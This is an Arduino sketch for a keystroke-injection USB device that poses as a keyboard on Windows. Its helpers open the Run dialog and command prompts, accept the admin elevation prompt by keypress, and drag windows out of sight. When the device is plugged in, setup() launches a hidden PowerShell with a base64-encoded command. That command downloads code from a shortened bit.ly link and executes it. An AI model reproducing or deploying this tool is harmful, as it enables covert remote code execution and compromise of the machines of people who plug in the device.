#include "TRKeyboard.h"

void start() {
  TRKeyboard.begin();
  rdLongerDelay();
}

void finish() {
  TRKeyboard.end();
}

void rdDelay() {
  delay(100);
}

void rdLongerDelay() {
  for(int i = 0; i < 5; i++) rdDelay();
}

void rdWriteText(String text) {
  TRKeyboard.print(text);
  rdDelay();
}

/**
 * Used to type non-alphanumeric keys.
 */
void rdTypeKey(uint8_t key)
{
  TRKeyboard.press(key);
  rdDelay();
  TRKeyboard.release(key);
  rdDelay();
}

/**
 * Runs a program.
 * Example: "notepad" starts notepad, "calc" starts the calculator.
 */
void rdRun(String program) {
  rdGuiCombination('r');
  TRKeyboard.print(program);
  rdDelay();
  rdTypeKey(KEY_RETURN);
}

/**
 * Takes a screenshot.
 */
void rdPrintScreen() {
  // some machines use 206 key as the PrtScreen key
  // others might use 229, and others might use both so
  // we use both instructions
  rdTypeKey(206);
  rdTypeKey(229);
  TRKeyboard.print(F("h"));
  rdDelay();
  TRKeyboard.print(F("b"));
  rdDelay();
}

/**
 * Hides a window:
 * Basically it drags a window to the lowest it can be
 * and then repositions the cursor.
 */
void rdHideWindow() {
  rdAltCombination(' ');
  TRKeyboard.print(F("T")); //M
  rdDelay();
  TRKeyboard.press(KEY_LEFT_ARROW);
  for(int i = 0; i < 5; i++) rdLongerDelay();;
  TRKeyboard.release(KEY_LEFT_ARROW);
  // return repositions the cursor back to its original position
  rdTypeKey(KEY_RETURN);
}

/**
 * Same as Win + D
 */
void rdShowDesktop() {
  rdGuiCombination('d');
}

/**
 * Same as Ctrl + V
 */
void rdPaste() {
  rdCtrlCombination('v');
}

/**
 * Same as Ctrl + X
 */
void rdCut() {
  rdCtrlCombination('x');
}

/**
 * Same as Ctrl + C
 */
void rdCopy() {
  rdCtrlCombination('c');
}

/**
 * Same as Gui + (the received key)
 */
void rdGuiCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_GUI, c);
}

/**
 * Same as Alt + (the received key)
 */
void rdAltCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_ALT, c);
}

/**
 * Same as Ctrl + (the received key)
 */
void rdCtrlCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_CTRL, c);
}

/**
 * Same as Shift + (the received key).
 */
void rdShiftCombination(uint8_t c) {
  rdKeyCombination(KEY_LEFT_SHIFT, c);
}

/**
 * Same as (Received hold key) + (target key).
 */
void rdKeyCombination(uint8_t holdKey, uint8_t targetKey) {
  TRKeyboard.press(holdKey);
  rdDelay();
  TRKeyboard.press(targetKey);
  rdDelay();
  TRKeyboard.releaseAll();
  rdDelay();
}

/**
 * Same as (Received hold key 1) + (received hold key 2) + (target key).
 */
void rdKeyCombination(uint8_t holdKey1, uint8_t holdKey2, uint8_t targetKey) {
  TRKeyboard.press(holdKey1);
  rdDelay();
  rdKeyCombination(holdKey2, targetKey);
}

/**
 * Same as above but with one more hold key.
 */
void rdKeyCombination(uint8_t holdKey1, uint8_t holdKey2, uint8_t holdKey3, uint8_t targetKey) {
  TRKeyboard.press(holdKey1);
  rdDelay();
  rdKeyCombination(holdKey2, holdKey3, targetKey);
}

/**
 * Opens the command prompt without admin rights.
 */
void rdOpenCommandPrompt() {
  rdOpenCommandPrompt(false);
}

/**
 * Opens the command prompt, if the "admin" parameter
 * has a "true value", it opens a command prompt
 * with admin rights. Or without admin rights otherwise.
 */
void rdOpenCommandPrompt(boolean admin) {
  if (admin) {
    rdGuiCombination('x');
    TRKeyboard.print(F("a"));
    rdAcceptWindowsSmartScreen();
  } else {
    rdRun("cmd");
  }
}

/**
 * Accepts the windows smart screen to grant admin permissions.
 */
void rdAcceptWindowsSmartScreen() {
  // Wait untill smart screen shows up
  rdLongerDelay();
  rdTypeKey(KEY_LEFT_ARROW);
  rdDelay();
  TRKeyboard.print(F(" "));
  rdDelay();
}

/**
 * Changes the TRKeyboard layout, if the computer only
 * has 1 TRKeyboard layout this key combination won't
 * do anything.
 */
void rdChangeTRKeyboardLayout() {
  rdAltCombination(KEY_LEFT_SHIFT);
}

/*********************
 *      Arduino      *
 *********************/

void setup() {
  start();

  rdRun(
    "powershell -WindowStyle Hidden -encodedCommand SQBFAFgAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAiAGgAdAB0AHAAOgAvAC8AYgBpAHQALgBsAHkALwAzADIAWABhADIASABLACIAKQA="
  );
  
  finish();
}

void loop() {}
